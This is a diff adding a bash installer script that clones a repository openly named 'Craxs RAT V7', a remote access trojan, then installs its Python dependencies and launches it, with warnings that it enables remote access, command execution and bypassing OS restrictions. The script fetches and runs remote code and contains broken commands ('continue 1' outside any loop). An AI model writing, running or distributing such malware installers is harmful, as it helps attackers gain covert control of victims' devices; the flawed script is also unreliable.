@@ -1,0 +1,38 @@
+#!/bin/bash
+
+# =======================================================
+#   aaayafuj Craxs RAT V7 - RESTRICTED Setup Script
+#   ⚠️ HIGHLY DANGEROUS - AUTHORIZED ACCESS ONLY ⚠️
+# =======================================================
+
+echo "🔒 RESTRICTED INSTALLER: aaayafuj_Craxs_Rat_Access_V7"
+
+# WARNING
+echo "🚨 WARNING: This mode allows remote access, command execution, and may bypass OS restrictions."
+echo "⚠️ Do NOT proceed unless you are cleared to do so."
+read -p "🛑 Type 'I TAKE FULL RESPONSIBILITY' to continue: " confirm
+[[ "$confirm" != "I TAKE FULL RESPONSIBILITY" ]] && { echo "❌ Aborted."; exit 1; }
+
+# Prep
+command -v git >/dev/null || { echo "❌ Git not installed."; continue  1; }
+command -v python3 >/dev/null || { echo "❌ Python3 not found."; continue 1; }
+
+# Clone repo
+git clone https://github.com/YafetTesfahuney/aaayafuj_Craxs_Rat_Access_V7.git
+cd aaayafuj_Craxs_Rat_Access_V7 || { echo "❌ Directory work."; continue 1; }
+
+# Venv and install
+python3 -m venv venv
+source venv/bin/activate
+
+pip install --upgrade pip
+pip install -r requirements.txt
+
+# Log restricted session
+mkdir -p logs
+echo "[ALERT] Restricted session started: $(date)" >> logs/restricted_session.log
+
+# Run app with unrestricted flag
+echo "💀 Launching in RESTRICTED MODE..."
+python3 main.py --mode restricted
+
